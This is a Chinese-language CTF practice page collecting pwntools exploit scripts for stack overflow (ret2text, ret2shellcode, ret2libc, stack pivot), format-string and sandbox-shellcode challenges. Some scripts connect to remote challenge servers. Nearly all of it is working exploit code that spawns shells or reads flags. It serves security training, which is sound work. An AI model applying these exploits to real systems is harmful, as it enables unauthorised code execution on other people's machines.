---
sidebar_label: '练习题'
sidebar_position: 5
---

# 栈溢出

## ret2text

### ret2text0_x32

:star2:exp:

```
from pwn import *
context(os="linux",arch="i386",log_level="debug")
elf = ELF("ezr0p")
io = process("ezr0p")
sys_adr = elf.symbols["system"]
shell_adr = 0x804A080
callsys = 0x8048562
print("sys_adr -------> "+ hex(sys_adr))
# payload = b's' * (28+4) + p32(sys_adr) + p32(0)+ p32(shell_adr)
payload = b's' * (28+4) + p32(callsys)+ p32(shell_adr)
io.recvuntil(b"please tell me your name")
io.send(b"/bin/sh")
io.recvuntil(b"now it's your play time~")
io.send(payload)
io.interactive()
```

### ret2text1

:star2:exp:

```python
from pwn import *
context(os="linux",arch='amd64',log_level="debug")
elf = ELF("./pwn")
io = process("./pwn")
backdoor = elf.symbols["backdoor"]
sys_adr = elf.symbols["system"]
print(hex(backdoor))
pop_rdi = 0x4012c3
shell_adr = 0x40201A
payload = 0x58*b's'+ p64(backdoor)
payload = b's' * 0x58 +p64(pop_rdi) + p64(shell_adr) +p64(sys_adr)
# io.recvline()
io.sendlineafter(b"do you know ret2text?",payload)
io.interactive()
```

### ret2text2

:star2:exp:

```python
from pwn import *
from LibcSearcher import*
import sys
remote_addr = ["49.233.15.226",8003]
#libc=ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("")
    context(arch='', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

pop_rdi = 0x4012c3
bin_sh = 0x404048
system_addr = 0x401254

payload = b'a' (0xa0 + 0x8) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
sl(payload)

shell()
```

### ret2text3

:star2:exp:

```python
from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["gxh191.top",25534]
#libc=ELF('')
elf = ELF('./pwn3_2')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn3_2")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p)
system_plt = p64(elf.plt['system'])
pop_rdi = p64(0x4012c3)
binsh = p64(0x404090)
ret = p64(0x40101a)

ru(b':\n')
payload = b'/bin/sh\x00'
s(payload)
ru(b'something: ')
payload = b'a' * (0x10 + 8) + ret + pop_rdi + binsh + system_plt
s(payload)

shell()
```

## ret2shellcode

### ezshellcode

:star2:exp:

```
from pwn import *
context(os='linux',arch='i386',log_level='debug')
elf = ELF("./pwn")
# io = remote("node4.buuoj.cn",26890)
io= process("./pwn")
io.recvuntil(b"What's this:")
shell_adr = int(io.recv(10)[2:],16)
print(hex(shell_adr))
shellcode = asm(shellcraft.sh())
payload = shellcode
payload = payload.ljust(140,b's')
payload += p32(shell_adr)
io.sendline(payload)
io.interactive()
```

:star:ret2libc打法：

```
from pwn import *
import sgtlibc
context(os='linux',arch='i386',log_level='debug')
elf = ELF("./pwn")
io = remote("node4.buuoj.cn",26890)

write_plt = elf.plt['write']
write_got = elf.got['write']
main_adr = 0x804847B
payload = b's'*140 + p32(write_plt) + p32(main_adr) + p32(1) + p32(write_got) + p32(4)
io.sendline(payload)
write_adr = u32(io.recv(4))
libc = sgtlibc.Searcher("write",write_adr)
system_adr = libc.get_address(sgtlibc.s_system)
shell_adr = libc.get_address(sgtlibc.s_binsh)
payload2 = b's'*140 + p32(system_adr) + p32(0) + p32(shell_adr)
io.sendline(payload2)
io.interactive()
```

## ret2syscall

## ret2libc

## ORW

## stack_pivot

:star2:exp:

```
from pwn import *
import sgtlibc
context(os="linux",arch='amd64',log_level='debug')
elf=ELF("pwn")
io=process("./pwn")

read_adr = 0x4011FD
addr1 = 0x404858
payload1 = b's'*80 + p64(addr1) + p64(read_adr)
io.sendlineafter(b"do you know stack pivoting?",payload1)
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
pop_rdi = 0x401283
leave_ret = 0x40121d
payload2 = p64(0x404808)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read_adr)
payload2 = payload2.ljust(80,b'\x00') + p64(0x404808) + p64(leave_ret)
io.send(payload2)
puts_adr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("puts_adr -----> "+hex(puts_adr))
libc = sgtlibc.Searcher()
libc.add_condition("puts",puts_adr)
libc.dump(db_index=2)
system_adr = libc.get_address(sgtlibc.s_system)
shell_adr = libc.get_address(sgtlibc.s_binsh)
# gdb.attach(io)
# pause()
payload3 = p64(0) + p64(pop_rdi) + p64(shell_adr) + p64(system_adr)
payload3 = payload3.ljust(80,b"\x00") + p64(0x4047b8) + p64(leave_ret)
io.send(payload3)

io.interactive()
```



# 格式化字符串

## fmt2_x64

:star:exp:

```python
from pwn import *
import sgtlibc
p = process("./fmt2_x64")

p.sendafter(b">>>\n", "%39$p")
libc = int(p.recv(14).decode("utf-8"), 16) - 0x21c87
print(hex(libc))
one = libc + 0x4f420
context.arch = 'amd64'
success(hex(one))
payload = fmtstr_payload(6, {0x601028:p64(one)})
p.sendline(payload)

p.interactive()
```

## fmt3_x64

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
io = process("./fmt3_x64")
payload = fmtstr_payload(6,{0x6009b8:0x4006f8})
print(payload)
io.recvuntil(b">>>")
gdb.attach(io)
pause()
io.sendline(payload)
io.interactive()
```



# 保护绕过

## canary

## PIE

## sandbox

### shellcode

:star:exp:

```python
from pwn import *
context(os='linux',arch="amd64",log_level='debug')
elf = ELF("./shellcode")
shangu = 0
io = process("./shellcode")

shellcode = asm(shellcraft.cat('flag'))
shellcode2 = asm('''
sub rsp,0x30
call rsp
''')
print(shellcode)
shellcode=shellcode.ljust(0x28,b"\x00")

jmp_jsp = 0x400785
payload = shellcode + p64(jmp_jsp) + shellcode2
gdb.attach(io)
pause()
io.sendafter(b"Can u pwn me?",payload)
io.interactive()
```

